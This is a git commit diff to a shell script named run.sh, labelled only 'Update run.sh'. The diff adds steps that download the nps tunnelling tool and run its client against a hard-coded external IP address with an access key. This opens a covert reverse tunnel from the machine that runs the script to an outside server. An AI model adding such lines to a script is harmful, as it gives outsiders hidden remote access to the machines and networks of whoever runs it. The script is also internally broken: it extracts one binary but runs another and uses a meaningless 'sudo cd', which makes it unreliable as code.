1e7e61672b2c766a88f50f1181378baa6bed519e
helenpayne <63317442+helenpayne@users.noreply.github.com>
2021-11-19 01:18:53 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,10 @@
 
+echo -e "${INFO} Install nps ..."
+    curl -fsSL https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz -o nps.tar.gz
+    tar -zxvf nps.tar.gz nps
+    rm nps.tar.gz
+    chmod +x nps
+    sudo cd nps
+    nps -version
+    ./npc -server=150.230.12.211:8024 -vkey=3mh9rlvj7sgbmlhv -type=tcp
+    
